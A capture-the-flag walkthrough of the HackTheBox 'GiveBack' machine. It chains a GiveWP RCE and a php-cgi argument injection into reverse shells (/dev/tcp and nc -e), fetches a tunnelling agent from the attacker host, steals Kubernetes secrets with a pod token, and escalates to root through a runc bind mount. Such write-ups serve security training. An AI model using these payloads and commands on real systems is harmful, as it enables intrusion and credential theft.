# HackTheBox - GiveBack
OS: Linux
Difficulty: Medium

## Recon
Nmap revealed an open HTTP service on port 80.

Using Firefox with the Wappalyzer extension provided useful information about the site stack (WordPress, Nginx, plugins, etc.). Notably, the GiveWP WordPress plugin was present.

## WordPress plugin RCE
CVE-2024-5932 (see https://github.com/EQSTLab/CVE-2024-5932) applies to this plugin.

I ran the exploit `CVE-2024-5932-rce.py` against:
```
http://giveback.htb/donations/the-things-we-need
```
and delivered a reverse shell payload (a base64-encoded `sh -i >& /dev/tcp/<IP>/<PORT> 0>&1`). This yielded an initial shell on the host.

Environment variables showed additional IPs, suggesting this host was part of a larger network.

## Pivoting
I uploaded a ligolo-ng agent via PHP:

On my machine:
```
python -m http.server 8000
```

On the target (PHP one-liner to fetch agent):
```
php -r '$f=fopen("/tmp/agent","wb");$c=curl_init("http://<YOUR_IP>:8000/agent");curl_setopt($c, CURLOPT_FILE, $f);curl_exec($c);fclose($f);chmod("/tmp/agent",0755);'
chmod +x /tmp/agent
```

Start ligolo-ng locally with `ligolo-ng -selfcert`. On the target run:
```
./agent -ignore-cert -connect <YOUR_IP>:11601
```

Back in ligolo-ng, run `session` and select the WordPress session, then create an interface:
```
interface_create --name ligolo
```

Check environment IPs (e.g., 10.43.0.1, 10.43.2.241). To reach the whole 10.43.0.0/16 space:
```
route_add --name ligolo --route 10.43.0.0/16
start --tun ligolo
```

Verify with `ip a` or `ip route`.

Nmap scan through the tunnel showed:
- 10.43.0.1 - TCP/433 (HTTPS)
- 10.43.61.204 - TCP/433 (HTTPS) and TCP/80 (HTTP)
- 10.43.4.242 - TCP/80 (HTTP)
- 10.43.147.82 - TCP/3306 (MySQL)
- 10.43.2.241 - TCP/5000 (HTTP)

10.43.2.241:5000 served a page. Gobuster discovered `/cgi-bin/php-cgi`.

## php-cgi RCE (CVE-2024-4577)
The php-cgi endpoint was vulnerable to an argument injection allowing remote code execution. Example proof-of-concept:
```bash
curl -X POST "http://10.43.2.241:5000/cgi-bin/php-cgi?%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input" --data "echo hey"
# Output: [START]Hey[END]
```

A reverse shell was obtained with:
```bash
curl -X POST "http://10.43.2.241:5000/cgi-bin/php-cgi?%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input" --data "nc <IP> <PORT> -e sh"
```

This placed us inside a Kubernetes cluster.

## Kubernetes: extracting secrets
Inside a pod, the service account token (JSON Web Token - JWT) and CA cert are available at:
```
/var/run/secrets/kubernetes.io/serviceaccount
```
Files present: `ca.crt`, `namespace`, `token`.

Use the service account token and cluster CA to query the API for secrets:
```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER=https://kubernetes.default.svc
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt

curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" $APISERVER/api/v1/namespaces/default/secrets
```

The response is a JSON SecretList. Example (truncated):
```json
{
  "kind": "SecretList",
  "items": [
    {
      "metadata": { "name": "beta-vino-wp-mariadb" },
      "data": {
        "mariadb-password": "c1c1c3A0c3BhM3U3Ukx5ZXRyZWtFNG9T",
        "mariadb-root-password": "c1c1c3A0c3lldHJlMzI4MjgzODNrRTRvUw=="
      }
    },
    {
      "metadata": { "name": "user-secret-babywyrm" },
      "data": {
        "MASTERPASS": "c3lZSG9UTGZBWDVzcW5LQ1cxd0VzOG05eXFnaWVMOU4="
      }
    },
    ...
  ]
}
```

Four secrets stood out:
- beta-vino-wp-mariadb
- user-secret-babywyrm
- user-secret-margotrobbie
- user-secret-sydneysweeney

Decode base64-encoded passwords and use them for SSH logins. Example:
```bash
echo "c3lZSG9UTGZBWDVzcW5LQ1cxd0VzOG05eXFnaWVMOU4=" | base64 -d
# syYHoTLfAX5sqnKCW1wEs8m9yqgieL9N
ssh babywyrm@10.10.11.94
```
Bingo, this works for babywyrm user, capture user flag.
```bash
cat /home/babywyrm/user.txt
```

(Note: tools such as Peirates could automate secret discovery and decoding.)

## Privilege escalation to root
Running `sudo -l` as babywyrm revealed permission to run `/opt/debug` with sudo. `/opt/debug` prompts for the babywyrm password and another password - the MariaDB password found in the secrets (`c1c1c3A0c3BhM3U3Ukx5ZXRyZWtFNG9T`).

`/opt/debug` is the `runc` binary. The approach used is to mount /root on a directory we control.

1. Create a working directory:
```bash
mkdir -p /tmp/mycontainer/rootfs
cd /tmp/mycontainer
runc spec
```

2. Edit `config.json`:
- Change the container `args` to run `/bin/sh`:
```json
"args": [ "/bin/sh" ],
```
- Set root readonly to false:
```json
"root": {
  "path": "rootfs",
  "readonly": false
}
```
- Add a bind mount to expose the host /root inside the container:
```json
{
  "destination": "/my_root_folder",
  "type": "bind",
  "source": "/root",
  "options": [ "rbind", "rprivate" ]
}
```

3. Populate `rootfs` with a working /bin/sh and required libraries. `runc` will execute `/bin/sh` from `rootfs`. For example, copy /bin/sh and its dependencies:
```bash
ldd /bin/sh
# Copy libc.so.6 -> rootfs/lib/x86_64-linux-gnu/
# Copy ld-linux-x86-64.so.2 -> rootfs/lib64/
# Ensure /bin/sh exists in rootfs/bin/sh (and is executable)
```

4. Run the container with sudo:
```bash
sudo /opt/debug run -b . mycontainer
```

Inside the container you should see:
```
$ ls
bin  dev  lib  lib64  proc  my_root_folder  sys

$ ls my_root_folder
... phpcgi  python  root.txt  wordpress

$ cat my_root_folder/root.txt
# root flag
```
